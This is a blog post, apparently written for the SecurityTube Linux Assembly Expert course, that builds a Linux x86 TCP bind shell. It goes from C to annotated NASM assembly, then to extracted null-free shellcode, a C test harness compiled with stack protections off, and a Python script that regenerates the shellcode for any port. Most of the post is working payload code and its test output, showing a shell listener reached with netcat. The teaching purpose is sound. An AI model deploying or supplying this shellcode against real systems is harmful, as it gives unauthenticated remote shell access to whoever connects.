---
layout: post
title: Linux x86 TCP Bind Shell
tags: [slae]
---

I recently began working on the SLAE to get more familiar with Assembly and shellcoding. At some point I would like to do OSCE so maybe that'll be in the cards later this year. Anyways here is the first assignment for the SLAE exam which is a Linux x86 TCP bind shell written in Assembly. To get a good grasp on the steps that need to be taken it makes things easier to first create a bind shell in C and then break that code down for writing in Assembly.


_Note: I'm a C noob, so I know this code isn't the best, but it works for our purposes here. The code has lots of comments, not only to help me understand more effectively but hopefully it helps others._

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	// Create the socket (man socket)
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	// 0 leaves it up to the service provider for protocol, which will be TCP
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);


	// Create sockaddr_in struct (man 7 ip)
	struct sockaddr_in host_addr;

	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	
	// Set port number to 1234, set to network byte order by htons
	host_addr.sin_port = htons(1234);

	// Listen on any interface
	host_addr.sin_addr.s_addr = INADDR_ANY;
	
	// Bind address to socket (man bind)
	bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));

	// Use the created socket to listen for connections (man listen)
	listen(host_sock, 0);

	// Accept connections, (man 2 accept) use NULLs to not store connection information from peer
	int client_sock = accept(host_sock, NULL, NULL);

	// Redirect stdin to client
	dup2(client_sock, 0);
	
	// stdout
	dup2(client_sock, 1);

	// stderr
	dup2(client_sock, 2);

	// Execute /bin/sh (man execve)
	execve("/bin/sh", NULL, NULL);

}

```

We can quickly compile and test this code to ensure everything is working properly.

```
absolomb@ubuntu:~/SLAE/assignments/1$ gcc bindshell.c -o bindshell
absolomb@ubuntu:~/SLAE/assignments/1$ ./bindshell
```
```
absolomb@ubuntu:~$ netstat -ano | grep 1234
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      off (0.00/0/0)
absolomb@ubuntu:~$ nc 127.0.0.1 1234
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Now that we have a solid reference to work from we can start breaking this down for porting to Assembly.

Looking at the C program we can essentially break it down into six different tasks.
	
- Creating a socket
- Binding the socket
- Configuring the socket to listen
- Accepting connections on the socket
- Redirecting STDIN, STDOUT, and STDERR to the client connection
- Executing a shell

Let's begin.

## Creating a Socket

Before we start, a quick rundown on how assembly uses registers for systemcalls.

- EAX will be used for the system call number. Once the system call is executed the return value is also stored here.
- EBX - will be used for the 1st Argument.
- ECX - will be used for the 2nd Argument.
- EDX - 3rd.
- ESI - 4th.
- EDI - 5th.

Now that's covered, let's dive in. 

We can look at system calls on our Ubuntu x86 machine at `/usr/include/i386-linux-gnu/asm/unistd_32.h`

To call the C equivalent of socket() we'll have to use socketcall with the SYS_SOCKET argument.

```
absolomb@ubuntu:~/SLAE/assignments/1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
#define __NR_socketcall 102
```

We can see this system call is number 102. 

If we look at the man page of socketcall we can see it takes two arguments (call and args).

- call determines which socket function to invoke
- args points to a block containing the actual arguments

We will need to use three registers to accomplish this.

- EAX will contain the system call for socketcall (102)
- EBX will contain the call argument to create a socket (SYS_SOCKET)
- ECX will point to the args (AF_INET, SOCK_STREAM, 0)

First we will need to zero out these registers by XOR'ing them with themselves. This ensures the registers are in a clean state for usage.

```nasm
xor eax, eax
xor ebx, ebx
xor ecx, ecx
```

Next we need to put the syscall for socketcall in EAX. To do this we first need to convert 102 to hexadecimal.

There are many tools to do this, we can do this easily with python.

```
absolomb@ubuntu:~/SLAE/assignments/1$ python3
Python 3.4.3 (default, Oct 14 2015, 20:33:09) 
[GCC 4.8.4] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(102)
'0x66'
```
To avoid nulls we will MOV 0x66 into AL rather than into EAX directly.

```nasm
mov al, 0x66
```

To figure out the number for the call to create the socket we can reference net.h. We'll be referencing the rest of these definitions for later use as well. 

```
absolomb@ubuntu:~/SLAE/assignments/1$ cat /usr/include/linux/net.h
~~~
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	2		/* sys_bind(2)			*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
~~~
```

We'll need 1 to create our socket, which means we can MOV that into BL, again avoiding nulls. 

```nasm
mov bl, 0x1
```

Now for the last part we'll need to have AF_INET, SOCK_STREAM, 0 as all one argument. To do this cleanly we can utilize the stack. Since the stack is First In, Last Out or LastIn, First Out (whichever saying you prefer) we'll need to PUSH our arguments in reverse order.

Since ECX was zeroed out earlier we can simply do a PUSH to get our first argument of 0 onto the stack.

```nasm
push ecx
```

We can find the number for SOCK_STREAM is set to 1, by doing the following:

```
absolomb@ubuntu:~/SLAE/assignments/1$ cat /usr/src/linux-headers-4.4.0-31/include/linux/net.h | grep SOCK_STREAM
 * @SOCK_STREAM: stream (connection) socket
	SOCK_STREAM	= 1,
```

Since EBX is already set to 1 we can simply push its value to the stack

```nasm
push ebx
```

Now for the last argument AF_INET,  we can take a look at `/usr/include/i386-linux-gnu/bits/socket.h`

What we see is that AF_INET is mapped to PF_INET which has a value of 2.

```nasm
push 0x2
```

Now we point ECX to the top of the stack and call the systemcall interrupt executing all of our arguments

```nasm
mov ecx, esp
int 0x80
```

As we know, EAX will now store the return value for our socket. Since we'll need to reuse EAX for the other system calls we'll need to preserve our socket elsewhere. We can do this by MOV'ing it to EDI.

```nasm
mov edi, eax
```  

## Binding the Socket

We'll need to call socketcall() again this time with the SYS_BIND argument. So once again we'll need to setup EAX with system call 102.

```
mov al, 0x66
```

We see from earlier that SYS_BIND is set to 2. We can set EBX to 2 by POP'ing the value off the stack since the top of stack already contains 2 from earlier.

```
pop ebx
```

Now we'll need to setup our bind() arguments correctly. If you recall from earlier our C code for the bind arguments were:

```c
bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
```

host_addr is a struct, which is basically just a group of variables. We setup that struct with the following:

```c
host_addr.sin_family = AF_INET;
host_addr.sin_port = htons(1234);
host_addr.sin_addr.s_addr = INADDR_ANY;
```

So we'll need to create this and utilize the stack to do so. 

INADDRY_ANY is defined in `/usr/src/linux-headers-4.4.0-31/include/uapi/linux/in.h` as 0.

htons(1234) can be converted into hex and then reversed for network byte order as 0xd204.

And we already know from earlier AF_NET is 2.

Since we need a 0 for our first argument to PUSH, we'll start by XOR'ing out EDX, which we haven't used yet. Then PUSH it to the stack.

```nasm
xor edx, edx
push edx
```

Next we'll push our port number to the stack. And since EBX already contains a 2, we can go ahead and push that.

```nasm
push word 0xd204
push bx
```

Now with our arguments setup correctly on the stack we can point ECX to the stack.

```nasm
mov ecx, esp
```

With our struct in place now we are ready to pass the bind arguments which will be the size of our struct, a pointer to our struct, and finally our socket we created from earlier(stored in EDI).

The size of our struct is 16 (0x10) so we'll push that to stack. We'll also push the value of ECX since it's currently pointing at the struct located on the stack. Finally we push our socket, and then point ECX to the top of the stack with all the arguments ready to be executed.

```nasm
push 0x10
push ecx
push edi
mov ecx, esp
int 0x80
```
After we execute the bind we go ahead and clear out EAX for use in the next step.

```nasm
xor eax, eax
```

## Configuring the Socket to Listen
	
Once again we'll be using socketcall(), this time with the SYS_LISTEN option (4) along with its two arguments which are our socket and the backlog argument.

Currently EAX contains 0, so we'll PUSH that along with our socket still stored in EDI.

```nasm
push eax
push edi
mov ecx, esp
```

Now the arguments are setup on the stack, we will need to store 4 in EBX and 0x66 for our socketcall in EAX. Since EBX is currently set to 2, we can simply increment it twice. Again, we'll need to MOV 0x66 into AL.

```nasm
inc ebx
inc ebx
mov al, 0x66
int 0x80
```

## Accept Connections

Referring back to our C code again we can see that accept was setup as follows:

```c
accept(host_sock, NULL, NULL);
```

First things first, let's setup the stack by pushing two 0's. To avoid nulls in the shellcode we'll XOR EDX with itself and then PUSH it twice to the stack.

```nasm
xor edx, edx
push edx
push edx
```

Next we'll push our socketfd to the stack from EDI. We also know that SYS_ACCEPT is defined as 5. EBX is already at 4, so we can do another increment here. The rest should be self-explanatory by now. 

```nasm
push edi
inc ebx
mov ecx, esp
mov al, 0x66
int 0x80
```

Our client socket will be returned into EAX so we'll need to preserve that by moving it out. Since our next step will be redirecting STDIN, STDOUT, and STDERR we can move this into EBX since it will need to be there as an argument for the dup2() syscall. 

```nasm
xchg ebx, eax
```

## Redirecting STDIN, STDOUT, and STDERR to the Client Connection

Looking at the C code again we can see that we used dup2() for the redirection:

```c
dup2(client_sock, 0);
```
We can iterate over each file descriptor (0,1,2) by using a loop to make things more efficient.

First we'll need to setup our counter in the counter register (ECX).

```nasm
xor ecx, ecx
mov cl, 0x2
```

Now comes the actual loop. We'll be using the JNS instruction which basically means continue to jump to the start of the loop until the signed flag is set. We'll be decrementing our counter register each time, and once -1 gets set in ECX, the signed flag will be set and break the loop.

We'll also need the dup2() system call number. Which we can find in `/usr/include/i386-linux-gnu/asm/unistd_32.h` as 63. Converted to hex that gives us 0x3f. 

```nasm
loop:
	mov al, 0x3f
	int 0x80
	dec ecx	
	jns loop
```

# Executing a Shell

Finally we have arrived at the end. No more socket calls here we simply need to call /bin/sh. 

Referencing our C code one last time:

```c
execve("/bin/sh", NULL, NULL);
```

Checking the main pages for execve() we see that /bin/sh will need to be our first argument (inside EBX) and we can null out the other two arguments since we aren't passing any arguments to /bin/sh. Since /bin/sh is only 7 characters we can add an extra slash in to make it an even 8 to make it easier for the hexadecimal translation. We'll also need to push /bin//sh in reverse as the stack grows from high to low memory. 

Utilizing python we can figure out what we need. 

```python
>>> a = '/bin//sh'
>>> a[::-1]
'hs//nib/'
```

We'll want to break up the string into 4 byte halves to have a clean hex address to use.

```python
>>> import binascii
>>> binascii.hexlify(b'hs//')
b'68732f2f'
>>> binascii.hexlify(b'nib/')
b'6e69622f'
```
First we push a null to the stack to null terminate our /bin//sh argument, then push our /bin//sh hex. The point ebx to the stack, null out the ECX register, move the execve syscall into EAX, and finally execute. 

```nasm
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, edx
mov al, 0xb	
int 0x80
```

## Final Assembly Code

```nasm
global _start

section .text
_start:

	
	;zero out registers for socketcall
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	; Create the socket

	mov al, 0x66 		; socketcall (102)
	mov bl, 0x1		; SYS_SOCKET (1)
	push ecx		; protocol (0)
	push ebx		; SOCK_STREAM (1)
	push 0x2		; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	int 0x80		; execute socket

	mov edi, eax		; move socket to edi

	; Bind the socket

	
	mov al, 0x66		; socketcall (102)
	pop ebx			; SYS_BIND (2)
	xor edx, edx		; zero out edx
	push edx		; INADDRY_ANY (0)
	push word 0xd204	; sin_port = 1234
	push bx			; AF_INET (2)
	mov ecx, esp		; point ecx to top of stack
	push 0x10		; sizeof(host_addr)
	push ecx		; pointer to host_addr struct
	push edi		; socketfd
	mov ecx, esp		; point ecx to top of stack 
	int 0x80		; execute bind
	
	xor eax, eax		; zero out eax

	; Listen on the socket
	
	push eax		; backlog (0)
	push edi		; socketfd
	mov ecx, esp		; point ecx to stack
	inc ebx			; increment to 3
	inc ebx			; increment to 4
	mov al, 0x66		; socketcall (102)
	int 0x80		; execute listen


	; Accept connections

	xor edx, edx		; zero out edx
	push edx		; NULL
	push edx		; NULL
	push edi		; socketfd
	inc ebx			; SYS_ACCEPT (5)
	mov ecx, esp		; point ecx to stack
	mov al, 0x66		; socketcall (102)
	int 0x80		; execute accept
	
	xchg ebx, eax		; move created client_sock in ebx
	
	; Redirect STDIN, STDERR, STDOUT

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set

	; Execute /bin/sh

	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f 	; "nib/"
	mov ebx, esp		; point ebx to stack
	mov ecx, edx		; NULL
	mov al, 0xb		; execve
	int 0x80		; execute execve

```


## Testing the Code


To make things easy a simple bash compile script is used for compiling and linking. 

```
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

```
absolomb@ubuntu:~/SLAE/assignments/1$ ./compile.sh bind_shell
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

To extract our shellcode out we'll use `objdump`.

```
absolomb@ubuntu:~/SLAE/assignments/1$ for i in $(objdump -d bind_shell |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x31\xd2\x52\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x50\x57\x89\xe1\x43\x43\xb0\x66\xcd\x80\x31\xd2\x52\x52\x57\x43\x89\xe1\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80
```

Now we can use a simple C program to test out our shellcode.

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x31\xd2\x52\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x50\x57\x89\xe1\x43\x43\xb0\x66\xcd\x80\x31\xd2\x52\x52\x57\x43\x89\xe1\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Now compile with GCC without stack protection and run.

```
absolomb@ubuntu:~/SLAE/assignments/1$ gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
absolomb@ubuntu:~/SLAE/assignments/1$ ./shellcode
Shellcode Length:  97
```

```
absolomb@ubuntu:~/SLAE/assignments/1$ netstat -ant | grep 1234
tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN     
absolomb@ubuntu:~/SLAE/assignments/1$ nc 127.0.0.1 1234
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

## Python Script for Configurable Port

To make the port configurable I made a simple Python script (which isn't the prettiest but works). The script will output the shellcode with the desired port.

```python
#!/usr/bin/env python3
import sys
import struct
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p', "--port")
args = parser.parse_args()

if args.port == None:
    parser.print_help()
    exit()

port = int(args.port)

if port > 65535:
    print("Please enter a valid port number!")
    exit()

if port < 1024:
    print("You'll need to be root to use this port!")

port = struct.pack("!H", port)

port = ("{}".format(''.join('\\x{:02x}'.format(b) for b in port)))

if "\\x00" in port:
    print(" Nulls in selected port!")
    exit()

shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02
\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x31\\xd2\\x52\\x66\\x68%s
\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0
\\x50\\x57\\x89\\xe1\\x43\\x43\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x52
\\x57\\x43\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0
\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f
\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80
""" % (port)

print("Shellcode:")
print(shellcode.replace("\n", ""))

```

Now to test, this time with a different port.

```
absolomb@ubuntu:~/SLAE/assignments/1$ python3 bindport.py 4444
Shellcode:
\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\xb0\x66\x5b\x31\xd2\x52\x66\x68\x11\\\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x50\x57\x89\xe1\x43\x43\xb0\x66\xcd\x80\x31\xd2\x52\x52\x57\x43\x89\xe1\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80
absolomb@ubuntu:~/SLAE/assignments/1$ vim shellcode.c
absolomb@ubuntu:~/SLAE/assignments/1$ gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
absolomb@ubuntu:~/SLAE/assignments/1$ ./shellcode
Shellcode Length:  97
```

```
absolomb@ubuntu:~$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
absolomb@ubuntu:~$ nc localhost 4444
id
uid=1000(absolomb) gid=1000(absolomb) groups=1000(absolomb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

Success! There is obviously some improvements that could be made to the assembly to help further shrink down the shellcode even more but this is a good start. Perhaps for the reverse shell option next I'll use some new and more efficient instructions. Thanks for reading if you made it this far!

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1208

Github Repo: <https://github.com/absolomb/SLAE>